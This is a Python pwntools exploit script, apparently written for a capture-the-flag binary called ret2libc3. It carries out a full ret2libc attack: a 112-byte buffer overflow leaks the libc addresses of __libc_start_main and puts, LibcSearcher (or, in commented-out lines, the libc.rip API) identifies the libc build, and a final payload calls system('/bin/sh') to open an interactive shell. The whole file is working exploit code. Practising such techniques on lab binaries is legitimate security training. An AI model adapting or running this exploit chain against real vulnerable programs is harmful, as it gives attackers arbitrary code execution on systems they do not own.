from pwn import *
from LibcSearcher import *
import requests as req

sh = process('./ret2libc3')
e = ELF('./ret2libc3')

#gdb.attach(sh, gdbscript='b *0x804868a\nc\n')

__libc_start_main_got = e.got['__libc_start_main']
_puts_plt = e.plt['puts']
_puts_got = e.got['puts']
_main_addr = e.symbols['_start']

print(sh.recvuntil(b'it !?'))
payload = b'a'*112 + p32(_puts_plt) + p32(_main_addr) + p32(__libc_start_main_got)
sh.sendline(payload)
__libc_start_main_addr = u32(sh.recvuntil(b'surprise')[0:4])
print(sh.recvuntil(b'it !?'))
payload = b'a'*112 + p32(_puts_plt) + p32(_main_addr) + p32(_puts_got)
sh.sendline(payload)
puts_addr = u32(sh.recv()[0:4])

#data = {'symbols' : {
#    '__libc_start_main': str(hex(__libc_start_main_addr)),
#    'puts': str(hex(puts_addr))
#    }}

obj = LibcSearcher("__libc_start_main", __libc_start_main_addr)


#r = req.post('https://libc.rip/api/find', json = data)
#print(r.json())
#libcdatabase = r.json()[0]['symbols']
#libcdatabase = {x:int(y,16) for x,y in libcdatabase.items()}
#libcbase = __libc_start_main_addr - libcdatabase['__libc_start_main']
#_system_addr = libcbase + libcdatabase['system']
#_bin_sh_addr = libcbase + libcdatabase['str_bin_sh']
#_puts_addr = libcbase + libcdatabase['puts']

libcbase = __libc_start_main_addr - obj.dump('__libc_start_main')
_system_addr = libcbase + obj.dump('system')
_bin_sh_addr = libcbase + obj.dump('str_bin_sh')
_puts_addr = libcbase + obj.dump('puts')


payload = b'a'*112 + p32(_system_addr) + p32(0xb) + p32(_bin_sh_addr)
sh.sendline(payload)
sh.interactive()
